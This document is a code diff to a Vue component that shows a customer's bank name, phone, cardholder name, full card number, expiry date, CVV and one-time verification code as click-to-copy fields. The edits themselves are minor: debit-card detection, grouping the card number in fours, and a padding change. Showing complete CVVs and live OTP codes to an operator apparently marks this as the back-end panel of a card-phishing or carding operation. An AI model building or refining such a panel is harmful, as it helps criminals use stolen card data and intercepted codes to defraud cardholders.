@@ -8,12 +8,15 @@ const props = defineProps<{
 
 const cardIcon = computed(() => {
   const level = (props.cardInfo.cardLevel || '').toUpperCase();
-  const isD = level.includes('DEBIT');
+  const ctype = (props.cardInfo.cardType || '').toUpperCase();
+  const isD = level.includes('DEBIT') || ctype.includes('DEBIT');
   return {
     type: isD ? 'D' : 'C',
     color: isD ? '#7367F0' : '#28C76F'
   };
 });
+
+function fmtCard(n: string) { return (n||'').replace(/\s/g,'').replace(/(\d{4})(?=\d)/g,'$1 ') }
 
 function copy(val: string) {
   if (!val) return;
@@ -41,7 +44,8 @@ function copy(val: string) {
     <div class="field field-wide" v-if="cardInfo.bankName" @click="copy(cardInfo.bankName)"><label>发卡行：</label><span class="value">{{ cardInfo.bankName }}</span></div>
     <div class="field" v-if="customerInfo.phone" @click="copy(customerInfo.phone)"><label>电话：</label><span class="value">{{ customerInfo.phone }}</span></div>
     <div class="field field-wide" v-if="cardInfo.cardHolder" @click="copy(cardInfo.cardHolder)"><label>持卡人：</label><span class="value">{{ cardInfo.cardHolder }}</span></div>
-    <div class="field field-card" v-if="cardInfo.cardNumber" @click="copy(cardInfo.cardNumber)"><label>卡号：</label><span class="value value-green">{{ cardInfo.cardNumber }}</span></div>
+    <div class="field field-card" v-if="cardInfo.cardNumber" @click="copy(cardInfo.cardNumber)">
+      <label>卡号：</label><span class="value value-green">{{ fmtCard(cardInfo.cardNumber) }}</span></div>
     <div class="field" v-if="cardInfo.expiry" @click="copy(cardInfo.expiry)"><label>有效期：</label><span class="value">{{ cardInfo.expiry }}</span></div>
     <div class="field" v-if="cardInfo.cvv" @click="copy(cardInfo.cvv)"><label>CVV：</label><span class="value">{{ cardInfo.cvv }}</span></div>
     <div class="field" v-if="cardInfo.otpCode" @click="copy(cardInfo.otpCode)"><label>验证码：</label><span class="value value-orange">{{ cardInfo.otpCode }}</span></div>
@@ -57,7 +61,7 @@ function copy(val: string) {
 .field-wide { min-width: 110px; max-width: 240px; }
 .field-card { min-width: 130px; max-width: 200px; }
 .field label { display: block; color: var(--n-text-color-3); font-size: 12px; margin-bottom: 4px; line-height: 12px; }
-.value { display: block; height: 24px; line-height: 24px; background: rgba(128,128,128,.12); border: 1px solid var(--n-border-color); color: var(--n-text-color); border-radius: .25rem; padding: 0 6px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 12px; }
+.value { display: block; height: 24px; line-height: 24px; background: rgba(128,128,128,.12); border: 1px solid var(--n-border-color); color: var(--n-text-color); border-radius: .25rem; padding: 0 8px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 12px; }
 html.dark .value { background: #41455C; }
 .value-green { background: #18a058; border-color: #18a058; color: #fff; font-weight: bold; }
 .value-orange { background: #f0a12d; border-color: #ffb545; color: #fff; font-weight: bold; }
